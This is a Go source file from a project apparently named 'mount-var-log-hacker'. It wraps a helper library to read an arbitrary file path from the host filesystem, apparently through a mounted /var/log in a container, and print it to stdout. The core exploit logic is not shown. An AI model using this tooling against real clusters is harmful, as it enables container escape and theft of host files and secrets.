package logcat

import (
	"fmt"
	"io"
	"os"

	"github.com/awslshadowstar/mount-var-log-hacker/pkg/logutil"
)

func DocatWrapperDefault(path string) error {
	return DocatWrapper(logutil.DefaultMountPath, path)
}

func DocatWrapper(hostPath string, path string) error {
	result, err := Docat(hostPath, path)
	if err != nil {
		return err
	}
	defer result.Close()
	io.Copy(os.Stdout, result)
	return nil
}

func Docat(hostPath string, path string) (io.ReadCloser, error) {
	if path[len(path)-1] == '/' {

		return nil, fmt.Errorf("error: %s is a directory", path)
	}
	logutil.MountHostPath = hostPath
	logutil.AttachToRoot()
	defer logutil.DetachFromRoot()

	return logutil.DoRequest(logutil.HOST_FS_BASE + path)
}
